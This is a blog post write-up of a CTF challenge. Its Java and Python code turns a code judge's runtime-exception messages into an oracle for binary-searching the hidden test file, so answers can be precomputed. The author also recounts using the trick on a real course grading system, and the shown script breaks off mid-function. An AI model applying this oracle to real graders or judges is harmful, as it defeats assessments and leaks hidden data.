<!DOCTYPE html>
<html lang="en"
  dir="ltr">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width">



<link rel="icon" type="image/ico" href="http://localhost:1313//favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313//favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313//favicon-32x32.png">
<link rel="icon" type="image/png" sizes="192x192" href="http://localhost:1313//android-chrome-192x192.png">
<link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313//apple-touch-icon.png">

<meta name="description" content=""/>



<title>
    
    TDC NET CTF 2023 - dm i programmering | 0xlime Blog
    
</title>

<link rel="canonical" href="http://localhost:1313/posts/dm-i-programmering/"/>

<meta property="og:url" content="http://localhost:1313/posts/dm-i-programmering/">
  <meta property="og:site_name" content="0xlime Blog">
  <meta property="og:title" content="TDC NET CTF 2023 - dm i programmering">
  <meta property="og:description" content="preface # This challenge was actually inspired by an actual vulnerability in codejudge which is a compettive programming scoring system. When I took my first masters at ITU we had a class that used codejudge, here we had this crazy hard competitive programming challenge that we managed to get the fastest solution for in java. We were able to leak the input file by throwing exceptions and then precomputing the answers and then just printing them. There was this furious guy who had written a super optimized solution in rust, he simply did not understand how we had managed to write a java solution that outperformed his. Anyway it turned into this challenge….">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-09-09T16:17:42+02:00">
    <meta property="article:modified_time" content="2023-09-09T16:17:42+02:00">













<link rel="stylesheet" href="/assets/combined.min.38f3885a8781b7bd7780021cc7bda42e40b3f6dfa0a57da2bbf7a80f944d1c5e.css" media="all">





</head>





<body class="auto">

  <div class="content">
    <header>
      

<div class="header">

    

    <h1 class="header-title">
        <a href="http://localhost:1313/">0xlime Blog</a>
    </h1>

    <div class="flex">
        

        
        
      
        <p class="small ">
            <a href="/" >
                /home
            </a>
        </p>
        
      
        <p class="small ">
            <a href="/posts" >
                /posts
            </a>
        </p>
        
      
        <p class="small ">
            <a href="https://r4.dk" >
                /about
            </a>
        </p>
        
        
    </div>

    

</div>

    </header>

    <main class="main">
      





<div class="breadcrumbs">
    
    <a href="/">Home</a>
    <span class="breadcrumbs-separator"> > </span>
    
    <a href="/posts/">Posts</a>
    <span class="breadcrumbs-separator"> > </span>
    
    <a class="breadcrumbs-current" href="/posts/dm-i-programmering/">TDC NET CTF 2023 - dm i programmering</a>
</div>



<div >

  <div class="single-intro-container">

    

    <h1 class="single-title">TDC NET CTF 2023 - dm i programmering</h1>
    

    

    <p class="single-readtime">
      
      
      
      <time datetime="2023-09-09T16:17:42&#43;02:00">September 9, 2023</time>
      

      
    </p>

  </div>

  

  

  

  

  <div class="single-content">
    <h3 class="heading" id="preface">
  preface
  <a class="anchor" href="#preface">#</a>
</h3>
<p>This challenge was actually inspired by an actual vulnerability in <code>codejudge</code> which is a compettive programming scoring system. When I took my first masters at ITU we had a class that used <code>codejudge</code>, here we had this crazy hard competitive programming challenge that we managed to get the fastest solution for in java. We were able to leak the input file by throwing exceptions and then precomputing the answers and then just printing them. There was this furious guy who had written a super optimized solution in rust, he simply did not understand how we had managed to write a java solution that outperformed his. Anyway it turned into this challenge&hellip;.</p>
<hr>
<h1 class="heading" id="dm-i-programmering">
  DM i programmering
  <a class="anchor" href="#dm-i-programmering">#</a>
</h1>
<p>So this challenge asks you to solve the shortest path problem, but the graph is huge and the time available on the cpu is too slow to actually solve the challenge, also the program can maximum be 10.000 characters so its not even possible to just preprocess the graph in the code.</p>
<p>We are however given the input graph to preprocess it and create &ldquo;cool shit&rdquo;, but that won&rsquo;t help us alone, we cannot preprocess the whole graph as an object, again due to the char limit.</p>
<p>So we have to cheat in some way, the key part of the description is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>The graph will be given, but the test cases are naturally hidden. You will be notified of compile errors and runtime exceptions.
</span></span></code></pre></div><p>and</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>The file tests.txt starts with a single integer ( i ) ( 1 ≤ i ≤ 100 ) on a single line which represents the amount of test cases. Then follows i lines with each two space separated integers. The first integer is the id of the source node, the second is the id of the destination node.
</span></span></code></pre></div><p>So there is some input file, if we knew about the content of the input file, then we could figure out the question suite and preprocess the answers on our much beefier machines with unlimited time, and then just print out the answers?</p>
<p>First lets just give chatgpt the description and have it solve it in python for example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> heapq
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">read_graph</span>(file_name):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(file_name, <span style="color:#f1fa8c">&#39;r&#39;</span>) <span style="color:#ff79c6">as</span> file:
</span></span><span style="display:flex;"><span>        num_nodes <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(file<span style="color:#ff79c6">.</span>readline()<span style="color:#ff79c6">.</span>strip())
</span></span><span style="display:flex;"><span>        num_edges <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(file<span style="color:#ff79c6">.</span>readline()<span style="color:#ff79c6">.</span>strip())
</span></span><span style="display:flex;"><span>        file<span style="color:#ff79c6">.</span>readline()  <span style="color:#6272a4"># Skip the blank line</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        graph <span style="color:#ff79c6">=</span> {i: [] <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(num_nodes)}
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> _ <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(num_edges):
</span></span><span style="display:flex;"><span>            node_from, node_to, weight <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">map</span>(<span style="color:#8be9fd;font-style:italic">int</span>, file<span style="color:#ff79c6">.</span>readline()<span style="color:#ff79c6">.</span>strip()<span style="color:#ff79c6">.</span>split())
</span></span><span style="display:flex;"><span>            graph[node_from]<span style="color:#ff79c6">.</span>append((node_to, weight))
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> graph
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">dijkstra</span>(graph, start, end):
</span></span><span style="display:flex;"><span>    distances <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">float</span>(<span style="color:#f1fa8c">&#39;inf&#39;</span>)] <span style="color:#ff79c6">*</span> <span style="color:#8be9fd;font-style:italic">len</span>(graph)
</span></span><span style="display:flex;"><span>    distances[start] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    priority_queue <span style="color:#ff79c6">=</span> [(<span style="color:#bd93f9">0</span>, start)]
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> priority_queue:
</span></span><span style="display:flex;"><span>        current_distance, current_node <span style="color:#ff79c6">=</span> heapq<span style="color:#ff79c6">.</span>heappop(priority_queue)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> current_distance <span style="color:#ff79c6">&gt;</span> distances[current_node]:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">continue</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> neighbor, weight <span style="color:#ff79c6">in</span> graph[current_node]:
</span></span><span style="display:flex;"><span>            distance <span style="color:#ff79c6">=</span> current_distance <span style="color:#ff79c6">+</span> weight
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> distance <span style="color:#ff79c6">&lt;</span> distances[neighbor]:
</span></span><span style="display:flex;"><span>                distances[neighbor] <span style="color:#ff79c6">=</span> distance
</span></span><span style="display:flex;"><span>                heapq<span style="color:#ff79c6">.</span>heappush(priority_queue, (distance, neighbor))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> distances[end]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">read_tests_and_find_distances</span>(graph_file, test_file):
</span></span><span style="display:flex;"><span>    graph <span style="color:#ff79c6">=</span> read_graph(graph_file)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(test_file, <span style="color:#f1fa8c">&#39;r&#39;</span>) <span style="color:#ff79c6">as</span> file:
</span></span><span style="display:flex;"><span>        num_tests <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(file<span style="color:#ff79c6">.</span>readline()<span style="color:#ff79c6">.</span>strip())
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> _ <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(num_tests):
</span></span><span style="display:flex;"><span>            start, end <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">map</span>(<span style="color:#8be9fd;font-style:italic">int</span>, file<span style="color:#ff79c6">.</span>readline()<span style="color:#ff79c6">.</span>strip()<span style="color:#ff79c6">.</span>split())
</span></span><span style="display:flex;"><span>            distance <span style="color:#ff79c6">=</span> dijkstra(graph, start, end)
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(distance)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Usage</span>
</span></span><span style="display:flex;"><span>graph_file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;graph.txt&#39;</span>
</span></span><span style="display:flex;"><span>test_file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;tests.txt&#39;</span>
</span></span><span style="display:flex;"><span>read_tests_and_find_distances(graph_file, test_file)
</span></span></code></pre></div><p>This script can take the inputs like the challenge and spit out the answer, we will use it later.</p>
<p>So we need the <code>tests.txt</code> somehow.</p>
<p>So we should turn the runtime exception into an oracle to leak the input. What if we create a java program, that reads the first integer fron <code>tests.txt</code> and throws an exception if the input is less than for example 5?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.BufferedReader;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.File;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.FileReader;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.ArrayList;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.List;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Run</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span>(String<span style="color:#ff79c6">[]</span> args) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        File graph <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> File(args<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]</span>);
</span></span><span style="display:flex;"><span>        File tests <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> File(args<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        List<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> graph_content <span style="color:#ff79c6">=</span> readFileContent(graph);
</span></span><span style="display:flex;"><span>        List<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> test_content <span style="color:#ff79c6">=</span> readFileContent(tests);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (Integer.<span style="color:#50fa7b">parseInt</span>(test_content.<span style="color:#50fa7b">get</span>(0)) <span style="color:#ff79c6">&lt;</span> 5){
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> RuntimeException();
</span></span><span style="display:flex;"><span>        }<span style="color:#ff79c6">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> List<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> <span style="color:#50fa7b">readFileContent</span>(File file) {
</span></span><span style="display:flex;"><span>        List<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> lines <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ArrayList<span style="color:#ff79c6">&lt;&gt;</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> (BufferedReader reader <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> BufferedReader(<span style="color:#ff79c6">new</span> FileReader(file))) {
</span></span><span style="display:flex;"><span>            String line;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">while</span> ((line <span style="color:#ff79c6">=</span> reader.<span style="color:#50fa7b">readLine</span>()) <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span>) {
</span></span><span style="display:flex;"><span>                lines.<span style="color:#50fa7b">add</span>(line);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">catch</span> (IOException e) {
</span></span><span style="display:flex;"><span>            System.<span style="color:#50fa7b">err</span>.<span style="color:#50fa7b">println</span>(<span style="color:#f1fa8c">&#34;An error occurred while reading the file: &#34;</span> <span style="color:#ff79c6">+</span> file.<span style="color:#50fa7b">getPath</span>());
</span></span><span style="display:flex;"><span>            e.<span style="color:#50fa7b">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> lines;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If we try to upload this script we get the following:</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/dm-i-programmering/1.png" width="2304px" height="678px">
    </div>

    
</figure>
</p>
<p>alright, lets try to change the script and flip the <code>&gt;</code> to <code>&lt;</code> and ask if the first input is larger than 5, then in case throw an exception.</p>
<p>We upload the script and then.</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/dm-i-programmering/2.png" width="2323px" height="710px">
    </div>

    
</figure>
</p>
<p>Ok so we can cleverly ask questions now, essentially binary searching the tests.txt file in the backend.</p>
<p>I wrote this super janky ass solve script on way too few hours of sleep. It will pull out all the test cases.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> urllib.parse <span style="color:#ff79c6">import</span> quote
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>burp0_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://157.230.16.162:10009/compile_and_run&#34;</span>
</span></span><span style="display:flex;"><span>burp0_headers <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;Cache-Control&#34;</span>: <span style="color:#f1fa8c">&#34;max-age=0&#34;</span>, <span style="color:#f1fa8c">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#f1fa8c">&#34;1&#34;</span>, <span style="color:#f1fa8c">&#34;Origin&#34;</span>: <span style="color:#f1fa8c">&#34;http://157.230.16.162:10009&#34;</span>, <span style="color:#f1fa8c">&#34;Content-Type&#34;</span>: <span style="color:#f1fa8c">&#34;application/x-www-form-urlencoded&#34;</span>, <span style="color:#f1fa8c">&#34;User-Agent&#34;</span>: <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&#34;</span>, <span style="color:#f1fa8c">&#34;Accept&#34;</span>: <span style="color:#f1fa8c">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#34;</span>, <span style="color:#f1fa8c">&#34;Referer&#34;</span>: <span style="color:#f1fa8c">&#34;http://157.230.16.162:10009/&#34;</span>, <span style="color:#f1fa8c">&#34;Accept-Encoding&#34;</span>: <span style="color:#f1fa8c">&#34;gzip, deflate&#34;</span>, <span style="color:#f1fa8c">&#34;Accept-Language&#34;</span>: <span style="color:#f1fa8c">&#34;en-US,en;q=0.9&#34;</span>, <span style="color:#f1fa8c">&#34;Connection&#34;</span>: <span style="color:#f1fa8c">&#34;close&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#This java code is used to get how many tests </span>
</span></span><span style="display:flex;"><span>javatests <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;import java.io.BufferedReader;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import java.io.File;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import java.io.FileReader;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import java.io.IOException;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import java.util.ArrayList;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import java.util.List;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">public class Run {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    public static void main(String[] args) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        File graph = new File(args[0]);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        File tests = new File(args[1]);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        List&lt;String&gt; graph_content = readFileContent(graph);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        List&lt;String&gt; test_content = readFileContent(tests);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        if (Integer.parseInt(test_content.get(FIRST)) &gt; SECOND){
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            throw new RuntimeException();
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        }else{
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            return;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    private static List&lt;String&gt; readFileContent(File file) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        List&lt;String&gt; lines = new ArrayList&lt;&gt;();
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            String line;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            while ((line = reader.readLine()) != null) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                lines.add(line);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        } catch (IOException e) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            System.err.println(&#34;An error occurred while reading the file: &#34; + file.getPath());
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            e.printStackTrace();
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        return lines;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">}
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#This java code is used to getting the inputs</span>
</span></span><span style="display:flex;"><span>javainputs <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;import java.io.BufferedReader;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import java.io.File;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import java.io.FileReader;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import java.io.IOException;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import java.util.ArrayList;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import java.util.List;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">public class Run {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    public static void main(String[] args) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        File graph = new File(args[0]);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        File tests = new File(args[1]);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        List&lt;String&gt; graph_content = readFileContent(graph);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        List&lt;String&gt; test_content = readFileContent(tests);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        String[] parts = test_content.get(LINE).split(&#34; &#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        int testint = Integer.parseInt(parts[INDEX]);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        if (testint &gt; TEST){
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            throw new RuntimeException();
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        }else{
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            return;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    private static List&lt;String&gt; readFileContent(File file) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        List&lt;String&gt; lines = new ArrayList&lt;&gt;();
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            String line;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            while ((line = reader.readLine()) != null) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                lines.add(line);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        } catch (IOException e) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            System.err.println(&#34;An error occurred while reading the file: &#34; + file.getPath());
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            e.printStackTrace();
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        return lines;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">}&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proxies <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;http&#39;</span>: <span style="color:#f1fa8c">&#39;http://127.0.0.1:8080&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;https&#39;</span>: <span style="color:#f1fa8c">&#39;http://127.0.0.1:8080&#39;</span>,
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">islargerthan_tests</span>(index,number):
</span></span><span style="display:flex;"><span>    index <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(index)
</span></span><span style="display:flex;"><span>    number <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(number)
</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> javatests<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34;FIRST&#34;</span>,index)<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34;SECOND&#34;</span>,number)
</span></span><span style="display:flex;"><span>    burp0_data <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;code&#34;</span>: payload}
</span></span><span style="display:flex;"><span>    a <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(burp0_url, proxies<span style="color:#ff79c6">=</span>proxies,headers<span style="color:#ff79c6">=</span>burp0_headers, data<span style="color:#ff79c6">=</span>burp0_data)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;runtime&#34;</span> <span style="color:#ff79c6">in</span> a<span style="color:#ff79c6">.</span>text:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">findtests</span>():
</span></span><span style="display:flex;"><span>    low, high <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">500000</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> low <span style="color:#ff79c6">&lt;=</span> high:
</span></span><span style="display:flex;"><span>        mid <span style="color:#ff79c6">=</span> (low <span style="color:#ff79c6">+</span> high) <span style="color:#ff79c6">//</span> <span style="color:#bd93f9">2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> islargerthan_tests(<span style="color:#bd93f9">0</span>,mid):
</span></span><span style="display:flex;"><span>            low <span style="color:#ff79c6">=</span> mid <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>            high <span style="color:#ff79c6">=</span> mid <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> low
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#tests = findtests()</span>
</span></span><span style="display:flex;"><span>tests<span style="color:#ff79c6">=</span><span style="color:#bd93f9">8</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;tests:&#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(tests))
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">islargerthan_inputs</span>(line,index,test):
</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> javainputs<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34;LINE&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(line))<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34;INDEX&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(index))<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34;TEST&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(test))
</span></span><span style="display:flex;"><span>    burp0_data <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;code&#34;</span>: payload}
